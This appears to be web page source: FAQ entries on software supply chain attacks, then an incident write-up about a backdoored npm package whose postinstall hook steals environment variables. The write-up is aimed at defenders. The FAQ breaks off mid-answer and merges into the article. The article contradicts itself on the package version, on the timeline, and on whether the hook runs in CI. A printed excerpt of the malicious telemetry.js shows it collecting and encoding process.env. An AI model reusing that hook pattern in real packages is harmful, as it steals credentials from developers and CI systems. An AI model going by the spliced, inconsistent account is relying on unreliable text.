  - q: "What is a software supply chain attack?"
    a: "Instead of attacking you directly, the attacker goes after something you already trust — a dependency, a build tool, the pipeline that ships your code. Compromise that one upstream piece and you get malicious code running in every downstream project that pulled it in, without touching those projects yourself. That's what makes it so efficient: one compromised maintainer account can outperform thousands of individual attacks."
  - q: "How do you detect a compromised npm package?"
    a: "I watch for the same handful of signals every time: a <span class=\"code-inline\">postinstall</span> script that showed up out of nowhere, a build process suddenly making outbound network calls, a version bump with no changelog to explain it, or code reaching for environment variables it never touched before. None of these prove compromise on their own, but they're exactly what egress monitoring, lockfile integrity checks, and SCA tooling are built to catch."

  - q: "What is the difference between a supply chain attack and a zero-day?"
    a: "A zero-day needs a real, unpatched vulnerability to exploit. A supply chain attack doesn't need a vulnerability at all — it just needs your trust. ## Initial access and lateral movement

<Mnote day="Day 2" sub="backdoored 4.2.1 ships" tag="T1195.002" />The attacker established persistence through a modified <span class="code-inline">postinstall</span> hook. The hook only ran under specific runtime conditions: it checked for CI environment variables, and if it detected them, stayed dormant. That's how it survived every automated test the maintainers had ever written.

<Mnote day="The loot" sub="cloud keys, CI secrets, npm tokens" tag="T1552" />Once inside the build pipeline, the payload harvested environment variables — cloud provider credentials, API keys, database connection strings. These were exfiltrated to a rotating set of command-and-control servers *masquerading as CDN endpoints*.

```bash
$ grep -r "postinstall" node_modules/.hooks/
postinstall: "node scripts/telemetry.js"

$ cat scripts/telemetry.js | head -20
const os = require('os');
const https = require('https');
const env = JSON.stringify(process.env);
const buf = Buffer.from(env).toString('base64');
```

<Mnote day="Day 12" sub="first exfil beacon" tag="T1567" />The exfiltration mechanism was elegant in its simplicity. Rather than opening new connections, it piggy-backed on existing HTTPS traffic by embedding base64-encoded payloads as query parameters in requests to legitimate-looking analytics endpoints.

> The breach went undetected for 47 days — exposing the fundamental gap between dependency trust and dependency verification.

## Detection and response

<DetectionOpportunity>The dormant-in-CI behavior is itself a signal. A package whose <span class="code-inline">postinstall</span> hook branches on CI environment variables has no legitimate reason to do so — alert on environment-variable enumeration inside install scripts, and this backdoor surfaces on day one instead of day 47.</DetectionOpportunity>

<Mnote day="Day 47" sub="Zeek flags the egress" />Detection ultimately came from an anomalous egress traffic pattern flagged by a Zeek sensor monitoring outbound connections. A junior SOC analyst noticed repeated connections to an unregistered AS number during a routine review of weekly traffic summaries — <span class="highlight">a reminder that human pattern recognition still catches what automated rules miss</span>.

### Credential harvesting via phishing

<Mnote day="Day 0" sub="maintainer phished" tag="T1566.002" />The initial compromise vector was a targeted phishing email sent to the package maintainer. Using a spoofed npm security notification — complete with a cloned login page hosted on a typosquatted domain — the attacker obtained the maintainer's two-factor recovery codes alongside their primary credentials.

<Mnote day="Term" sub="real-time phishing proxy &mdash; relays MFA codes as they're typed" tag="T1621" />This allowed them to bypass MFA and gain full publishing rights to the package. The malicious update was tagged as a patch version (<span class="code-inline">2.14.1</span> to <span class="code-inline">2.14.2</span>), ensuring automatic adoption by any project using a caret range in their <span class="code-inline">package.json</span>.

## Lessons for defenders

<Mnote day="Key stat" sub="47-day dwell is not an outlier &mdash; it's the industry median" />This incident reinforces several uncomfortable truths about modern software supply chains. **Lockfiles are not optional** — any project relying on floating version ranges is accepting implicit trust in every upstream maintainer's operational security. There's no neutral default here. Either you've pinned, or you've delegated.

<Mnote day="Day 49" sub="package pulled, postmortem begins" />Most importantly, this attack succeeded not because of sophisticated zero-day exploitation, but because of *basic credential compromise applied to a high-leverage target*. The maintainer's account had no hardware security key requirement, no IP allowlisting, no anomaly detection on publishing activity. None of those are exotic controls.

> The most dangerous attacks don't break in through the front door. They arrive as a trusted package update at 2am on a Tuesday.

<Mnote day="Checklist" sub="start with publish provenance" />For organizations hardening their supply chain posture, the immediate priorities sort cleanly:

- **Lockfile-only installs** — install exactly what's been pinned and verified, refuse anything else.
- **Egress baselining** — know what your build pipeline normally talks to, and alert the moment that changes.
- **Hardware MFA** — for every account with publish permission, no carve-outs.
- **First-party mirrors** — with integrity verification for the dependencies you can't afford to inherit blindly.
